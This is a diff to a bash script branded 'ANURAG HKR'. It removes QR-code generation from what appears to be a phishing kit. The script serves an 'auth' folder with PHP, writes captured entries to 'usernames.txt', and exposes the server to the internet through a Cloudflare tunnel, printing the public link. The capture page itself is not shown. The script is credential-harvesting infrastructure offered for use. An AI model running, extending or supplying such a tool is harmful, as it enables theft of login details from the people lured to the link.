@@ -22,12 +22,6 @@ rm -rf auth/ cloud.log
 mkdir -p auth
 touch usernames.txt
 
-# --- [NEW] AUTO INSTALL QR DRIVERS ---
-if ! command -v qrencode &> /dev/null; then
-    echo -e "${YELLOW}[*] Installing QR Code Drivers...${RESET}"
-    pkg install libqrencode -y > /dev/null 2>&1
-fi
-
 # Detect OS (Mobile vs PC)
 if [ -d "/data/data/com.termux/files/usr" ]; then
     # Android (Termux)
@@ -42,6 +36,7 @@ else
 fi
 
 # RANDOM PORT GENERATOR (The Fix)
+# 4000 se 9000 ke beech random port milega. Error kabhi nahi aayega.
 PORT=$((4000 + RANDOM % 5000))
 
 # --- 3. ADVANCE BANNER (ANURAG HKR) ---
@@ -142,8 +137,8 @@ exit();
 EOF
 
 # --- 6. MENU & EXECUTION ---
-echo -e "${GREEN}[1] Localhost QR (Fast)${RESET}"
-echo -e "${GREEN}[2] Cloudflare QR (Worldwide)${RESET}"
+echo -e "${GREEN}[1] Localhost (Test/WiFi)${RESET}"
+echo -e "${GREEN}[2] Cloudflare (Worldwide Link)${RESET}"
 echo ""
 echo -ne "${YELLOW}Select Option: ${RESET}"
 read option
@@ -152,13 +147,7 @@ if [[ $option == "1" ]]; then
     echo -e "${BLUE}[*] Starting Local Server on Port $PORT...${RESET}"
     $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
-    
-    LINK="http://127.0.0.1:$PORT"
-    echo -e "\n${GREEN}[✔] SCAN THIS QR CODE:${RESET}"
-    # QR GENERATION LOGIC
-    qrencode -t ANSIUTF8 "$LINK"
-    echo ""
-    echo -e "${GREEN}[✔] HOSTED: $LINK${RESET}"
+    echo -e "${GREEN}[✔] HOSTED: http://127.0.0.1:$PORT${RESET}"
 
 elif [[ $option == "2" ]]; then
     # Auto Download Cloudflare
@@ -181,19 +170,14 @@ elif [[ $option == "2" ]]; then
     # Start Tunnel on Same Random Port
     $RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
     
-    echo -ne "${YELLOW}[*] Generating Link & QR... ${RESET}"
-    for i in {1..20}; do
+    echo -ne "${YELLOW}[*] Generating Link... ${RESET}"
+    for i in {1..15}; do
         if [ -f cloud.log ]; then
             LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
             if [ ! -z "$LINK" ]; then
                 echo -e "\n\n${GREEN}========================================${RESET}"
                 echo -e "${YELLOW} URL: ${LINK} ${RESET}"
                 echo -e "${GREEN}========================================${RESET}"
-                echo ""
-                echo -e "${CYAN}[*] QR CODE GENERATED BELOW:${RESET}"
-                # QR GENERATION LOGIC ADDED HERE
-                qrencode -t ANSIUTF8 "$LINK"
-                echo ""
                 break
             fi
         fi
